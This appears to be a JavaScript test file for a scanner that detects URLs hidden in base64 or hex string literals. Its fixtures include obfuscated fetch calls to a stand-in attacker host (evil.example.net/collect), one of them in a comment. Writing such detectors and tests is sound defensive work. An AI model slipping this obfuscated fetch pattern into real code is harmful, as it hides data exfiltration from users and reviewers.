import { decodeIfHidingUrl, findDecodedUrls } from './decodeLiterals'

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64')
const hex = (s) => Buffer.from(s, 'utf8').toString('hex')

describe('decodeIfHidingUrl', () => {
    it('recovers a URL hidden in base64', () => {
        // The case every text scan in this file misses:
        //   fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw=="))
        const hidden = b64('https://evil.example.net/collect')
        expect(decodeIfHidingUrl(hidden)).toBe('https://evil.example.net/collect')
    })

    it('recovers a URL hidden in hex', () => {
        expect(decodeIfHidingUrl(hex('https://evil.example.net/c'))).toBe(
            'https://evil.example.net/c'
        )
    })

    it('ignores encoded data that is not a URL', () => {
        // 914 such candidates in one real bundle; none may fire.
        expect(decodeIfHidingUrl(b64('the quick brown fox jumps over'))).toBeNull()
    })

    it('ignores a hash or identifier that merely looks like base64', () => {
        expect(
            decodeIfHidingUrl('61c9d49ae64331402c3bde766c9dc504ed2ca509')
        ).toBeNull()
        expect(decodeIfHidingUrl('YWJjZGVmZ2hpamtsbW5vcHFy')).toBeNull()
    })

    it('ignores a plain URL, which is not hidden', () => {
        expect(
            decodeIfHidingUrl('https://docs.example.net/a/very/long/path/x')
        ).toBeNull()
    })

    it('ignores anything too short to be worth hiding', () => {
        expect(decodeIfHidingUrl(b64('http://a.io'))).toBeNull()
    })

    it('ignores non-strings', () => {
        expect(decodeIfHidingUrl(undefined)).toBeNull()
        expect(decodeIfHidingUrl(42)).toBeNull()
    })
})

describe('findDecodedUrls', () => {
    it('finds hidden payloads in raw source when no AST is available', () => {
        const source = `fetch(atob("${b64('https://evil.example.net/c')}"))`
        const found = findDecodedUrls(source, null)
        expect(found).toHaveLength(1)
        expect(found[0].decoded).toContain('evil.example.net')
    })

    it('prefers AST literals when they are available', () => {
        const literals = [
            { value: b64('https://evil.example.net/c'), index: 10 },
            { value: 'ordinary text', index: 90 },
        ]
        const found = findDecodedUrls('irrelevant', literals)
        expect(found).toHaveLength(1)
        expect(found[0].index).toBe(10)
    })

    it('finds nothing in ordinary source', () => {
        expect(
            findDecodedUrls('const a = "hello"; fetch("/api/x")', null)
        ).toEqual([])
    })
})
